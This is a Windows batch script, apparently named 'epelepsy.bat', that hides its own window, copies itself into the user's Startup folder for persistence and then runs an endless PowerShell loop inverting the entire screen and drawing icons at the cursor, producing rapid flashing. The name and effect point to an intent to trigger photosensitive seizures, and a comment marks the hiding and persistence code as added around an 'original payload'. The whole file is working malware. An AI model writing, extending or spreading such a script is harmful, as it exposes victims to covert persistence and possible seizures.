@echo off

:: If not already hidden, relaunch hidden and exit
if "%~1" neq "hidden" (
    powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden ^
        -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
    exit /b
)

copy "%USERPROFILE%\Downloads\epelepsy.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
copy "%USERPROFILE%\Downloads\epelepsy(1).bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$s=(New-Object -COM WScript.Shell).CreateShortcut('%StartupFolder%\epelepsy.lnk');$s.TargetPath='%TargetFile%';$s.WorkingDirectory='D:\';$s.Save()"



:: ---- YOUR ORIGINAL PAYLOAD BELOW (UNCHANGED) ----

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"Add-Type -AssemblyName System.Windows.Forms; ^
Add-Type -AssemblyName System.Drawing; ^
Add-Type 'using System;using System.Runtime.InteropServices;public class Effects{[DllImport(\"user32.dll\")]public static extern IntPtr GetDC(IntPtr h);[DllImport(\"gdi32.dll\")]public static extern bool BitBlt(IntPtr d,int x,int y,int w,int h,IntPtr s,int sx,int sy,int r);[DllImport(\"user32.dll\")]public static extern int ReleaseDC(IntPtr h,IntPtr d);[DllImport(\"user32.dll\")]public static extern bool GetCursorPos(out POINT p);[DllImport(\"user32.dll\")]public static extern IntPtr LoadIcon(IntPtr h,int n);[DllImport(\"user32.dll\")]public static extern bool DrawIcon(IntPtr d,int x,int y,IntPtr i);[DllImport(\"user32.dll\")]public static extern bool InvalidateRect(IntPtr h,IntPtr r,bool e);public struct POINT{public int X;public int Y;}}'; ^
$p=New-Object Effects+POINT; ^
$w=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; ^
$h=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; ^
$i=[Effects]::LoadIcon([IntPtr]::Zero,32513); ^
$c=0; ^
while($true){ ^
$d=[Effects]::GetDC([IntPtr]::Zero); ^
if(($c%%3)-eq 0){[Effects]::BitBlt($d,0,0,$w,$h,$d,0,0,0x00550009)}; ^
[Effects]::GetCursorPos([ref]$p); ^
[Effects]::DrawIcon($d,$p.X,$p.Y,$i); ^
[Effects]::ReleaseDC([IntPtr]::Zero,$d); ^
$c++; ^
Start-Sleep -Milliseconds 0 ^

}"

